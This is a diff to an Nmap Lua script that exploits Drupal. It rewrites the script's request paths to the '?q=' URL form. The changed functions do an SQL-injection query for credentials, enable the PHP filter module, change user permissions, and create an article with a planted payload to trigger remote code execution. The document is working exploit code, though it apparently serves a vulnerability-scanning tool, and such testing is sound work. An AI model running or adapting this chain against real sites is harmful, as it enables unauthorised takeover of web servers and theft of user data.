@@ -215,7 +215,7 @@ local function do_sql_query(host, port, uri, user)
       ['Content-Type'] = "application/x-www-form-urlencoded"
     }
   }
-  local res = http.post(host, port, uri .. "/user/login", opt, nil, r)
+  local res = http.post(host, port, uri .. "?q=/user/login", opt, nil, r)
   --TODO: Check return status
 
   return user, passwd
@@ -233,7 +233,7 @@ local function set_php_filter(host, port, uri, session, disable)
   local opt = {}
   opt['cookies'] = session.name ..'='.. session.value
 
-  local res = http.get(host, port, uri .. "/admin/modules", opt)
+  local res = http.get(host, port, uri .. "?q=/admin/modules", opt)
   if res == nil then return nil end
 
   local csrfToken = extract_CSRFtoken(res.body)
@@ -253,7 +253,7 @@ local function set_php_filter(host, port, uri, session, disable)
   data['form_token'] = csrfToken
   data['form_id'] = 'system_modules'
   data['op'] = 'Save configuration'
-  res = http.post(host, port, uri .. "/admin/modules/list/confirm", opt, nil, data)
+  res = http.post(host, port, uri .. "?q=/admin/modules/list/confirm", opt, nil, data)
   if res == nil then return nil end
 
   return true
@@ -271,7 +271,7 @@ local function set_permission(host, port, uri, session, disable)
   local opt = {}
   opt['cookies'] = session.name ..'='.. session.value
 
-  local res = http.get(host, port, uri .. "/admin/people/permissions", opt)
+  local res = http.get(host, port, uri .. "?q=/admin/people/permissions", opt)
   if res == nil then return nil end
 
   local csrfToken = extract_CSRFtoken(res.body)
@@ -291,7 +291,7 @@ local function set_permission(host, port, uri, session, disable)
   data['form_token'] = csrfToken
   data['form_id'] = 'user_admin_permissions'
   data['op'] = 'Save permissions'
-  res = http.post(host, port, uri .. "/admin/people/permissions", opt, nil, data)
+  res = http.post(host, port, uri .. "?q=/admin/people/permissions", opt, nil, data)
   if res == nil then return nil end
 
   return true
@@ -305,7 +305,7 @@ local function trigger_exploit(host, port, uri, session, cmd)
   -- add new Content page & trigger RCE
   stdnse.debug(1, string.format("%s", "creating new article page with planted payload"))
 
-  local res = http.get(host, port, uri .. "/node/add/article", opt)
+  local res = http.get(host, port, uri .. "?q=/node/add/article", opt)
   if res == nil then return nil end
 
   local csrfToken = extract_CSRFtoken(res.body)
@@ -327,7 +327,7 @@ local function trigger_exploit(host, port, uri, session, cmd)
   }
   local body = multipart_build_body(files, boundary)
 
-  res = http.post(host, port, uri .. "/node/add/article", opt, nil, body)
+  res = http.post(host, port, uri .. "?q=/node/add/article", opt, nil, body)
   if res == nil then return nil end
 
   return res.body, pattern
@@ -352,7 +352,7 @@ action = function(host, port)
     ['op'] = 'Log in',
   }
 
-  local res = http.post(host, port, uri .. "/user/login", nil, nil, data)
+  local res = http.post(host, port, uri .. "?q=/user/login", nil, nil, data)
 
   if res.status == 302 and res.cookies[1].name ~= nil then
     local vulnReport = vulns.Report:new(SCRIPT_NAME, host, port)
